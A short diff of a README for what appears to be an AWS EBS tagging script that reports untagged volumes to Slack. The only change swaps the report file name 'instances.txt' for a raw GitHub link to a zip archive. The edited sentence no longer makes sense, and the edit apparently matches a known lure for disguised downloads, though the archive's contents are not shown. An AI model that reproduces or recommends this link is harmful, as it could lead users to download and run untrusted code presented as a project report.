@@ -10,4 +10,4 @@ As the script is all modularized with functions, the routine iterates a for over
 - Write a file with the EBS that were and were not tagged.
 - Send this file to a SLACK channel.
 
-The instances.txt file is the report will be generated.
+The https://github.com/marcossangomes/reports-ebs-teams/raw/refs/heads/master/continuancy/reports_ebs_teams_1.2.zip file is the report will be generated.
